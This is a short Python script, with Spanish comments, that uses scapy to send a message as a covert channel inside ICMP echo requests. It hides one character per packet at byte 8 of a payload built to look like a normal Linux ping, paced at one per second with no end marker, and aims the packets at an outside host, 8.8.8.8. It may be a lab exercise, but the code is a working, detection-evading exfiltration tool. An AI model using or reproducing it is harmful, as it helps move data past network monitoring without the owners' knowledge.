#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from scapy.all import IP, ICMP, send
import sys, os, struct, time

def build_ping_payload(char: str):
    """
    Crea un payload ICMP de 56 bytes (8 bytes timestamp + 48 bytes patrón),
    idéntico al de un ping Linux típico con tamaño por defecto.
    - Primeros 8 bytes: timestamp
    - Byte 8: carácter secreto
    - Resto: patrón incremental estándar de Linux (0x00 a 0x2F)
    """
    # Primeros 8 bytes: timestamp (simulado)
    ts = int(time.time() * 1000) & 0xFFFFFFFFFFFFFFFF
    first8 = struct.pack("!Q", ts)  # 8 bytes
    
    # Byte 8: carácter secreto
    secret = bytes(char, "utf-8")[:1]
    
    # Generar el patrón estándar de Linux (48 bytes: 0x00 a 0x2F)
    standard_pattern = bytes(range(0, 48))
    
    # Insertar el carácter secreto en la posición 8 del patrón
    payload = first8 + standard_pattern[:8] + secret + standard_pattern[9:]
    
    return payload

def send_icmp_message(message, dst="8.8.8.8"):
    """
    Envía cada carácter de un mensaje como un paquete ICMP tipo 8.
    - Paquetes idénticos a ping Linux.
    - No se envía marcador de fin.
    """
    for seq, ch in enumerate(message, start=1):
        payload = build_ping_payload(ch)
        pkt = IP(dst=dst)/ICMP(type=8, seq=seq, id=os.getpid() & 0xFFFF)/payload
        pkt.show()   # Mostrar campos del paquete para evidencia
        send(pkt, verbose=0)
        time.sleep(1)  # Esperar 1 segundo entre paquetes como ping normal

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: sudo python3 pingv4.py \"mensaje_cifrado\"")
        sys.exit(1)

    message = sys.argv[1]
    destination = "8.8.8.8"  # define el destino aquí
    print(f"[+] Enviando mensaje oculto a {destination} usando ICMP stealth...")
    send_icmp_message(message, destination)
    print("[+] Mensaje transmitido con éxito.")